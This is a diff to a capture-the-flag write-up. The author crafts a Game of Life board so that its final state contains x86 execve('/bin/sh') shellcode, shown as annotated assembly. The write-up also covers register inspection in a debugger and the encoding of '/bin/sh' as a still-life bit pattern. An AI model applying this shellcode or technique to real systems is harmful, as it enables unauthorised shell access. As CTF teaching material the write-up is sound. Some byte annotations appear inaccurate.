@@ -59,7 +59,12 @@ While running it locally, a `Segmentation fault (core dumped)` was reported. The
 (TBD)
 
 ### Solution
-To solve this challenge I decided to construct an initial Game of Life board such that the final board would contain assembly code that when executed would provide an interactive shell to the client. I started with the following execve shellcode,
+To solve this challenge I decided to construct an initial Game of Life board such that the final board would contain assembly code that when executed would provide an interactive shell to the client. I decided to use execve system call to get a shell.
+
+I started with the following execve shellcode,
+```c
+ int execve(const char *path, char *const argv[], char *const envp[]);
+```
 
 ```assembly
 xor    %eax,%eax        ; "\x31\xC0"
@@ -74,14 +79,19 @@ mov    $0xb,%al         ; "\xA2\x00\x00\x00\x00"
 int    $0x80            ; "\xCD\x80"     
 ```
 This shellcode accomplishes the following,
-1. Sets eax to 0 and then pushes the value on the stack to Null-terminate the execution string
-2. Pushes the string "/bin/sh" on the stack
-3. Moves the address of the string to ebx
-4. Pushes eax on the stack again (still 0) in order to Null-terminate the char* array 
 
-I decided to attempt to encode the shellcode using only still life constructions. This would ensure that the entire construction would remain at the end of the 15 iterations. At 22 bytes, the binary encoding of this shellcode would eventually wrap around the 110 bits of the first line of the game board. The issue with wrapping is that it complicates the intial Game of Life construction and most likely would result in destabilizing it. Therefore, I decided to try and reduce the size of the shellcode to only 13 bytes. 
+1. Sets eax to 0 and then pushes the value on the stack to Null-terminate the path
+2. Pushes the the path string, "/bin/sh", on the stack
+3. Moves the address of the path to ebx
+4. Pushes eax on the stack again (still 0) in order to Null-terminate the argv array
+5. Pushes the address of the path on the stack
+6. Moves the adddress of the stack pointer to ecx
+7. Moves the system call number for execve into al
+8. Invokes the system call
 
-By setting a breakpoint at `0xf661e000`, the address of the game board, I would be able to determine the state of the registers and stack prior to executing the shellcode. The result was the following
+I decided to attempt to encode the shellcode using only still life constructions. This would ensure that the entire construction would remain during the 15 iterations. At 22 bytes, the binary encoding of this shellcode would eventually wrap around the 110 bits of the first line of the game board. Wrapping would complicate the ability to stabilize the still life constructions. Therefore, I decided to try and reduce the size of the shellcode to only 13 bytes. 
+
+By setting a breakpoint at `0xf661e000`, the address of the game board, I would be able to determine the state of the registers prior to executing the shellcode. The result was the following
 
 ``` assembly
 eax     0x0
@@ -92,4 +102,23 @@ esp     0xf6ffb6cc
 eip     0xf661e000
 ```
 
-Based on those register settings I could 
+Since the eax register is already set to 0, I could eliminate the `xor eax,eax` instruction. The next four instructions are all used to get the address null-terminated path "/bin/sh" into `ebx`. The `ebx` register contains the address of the last bit that was set due to sending the program a coordinate. If I could encode the "/bin/sh" on the game board and send the program the coordinates for the first bit of the string, then `ebx` would already contain the address of the path. This would eliminate the need for the four instructions.
+
+The path "/bin/sh" encodes to following binary string
+
+```
+00101111 01100010 01101001 01101110 00101111 01110011 01101000 
+```
+Unfortunately, the first bit is not a 1. Therefore I would need to set the coordinate 1 bit before my string and then increment ebx. I was able to encode "/bin/sh" using the following still life construction.
+
+```
+  00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
+  00011000000000000000000000000011000110000000011000000000000000000000000000000000000000000000000000000000000000
+  00001000000000000000000000000010000010001000010000000000000000000000000000000000000000000000000000000000000000
+  00010001011001100101100000000001000100010100000101101100000000000000000000000000000000000000000000000000000000
+->00101111011000100110100101101110001011110111001101101000000000000000000000000000000000000000000000000000000000
+  00101000000001000000000110101000001010000000100000000010000000000000000000000000000000000000000000000000000000
+  01100100000001100000000000000000011001000001000000000110000000000000000000000000000000000000000000000000000000
+  00001100000000000000000000000000000011000001100000000000000000000000000000000000000000000000000000000000000000
+  00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
+```
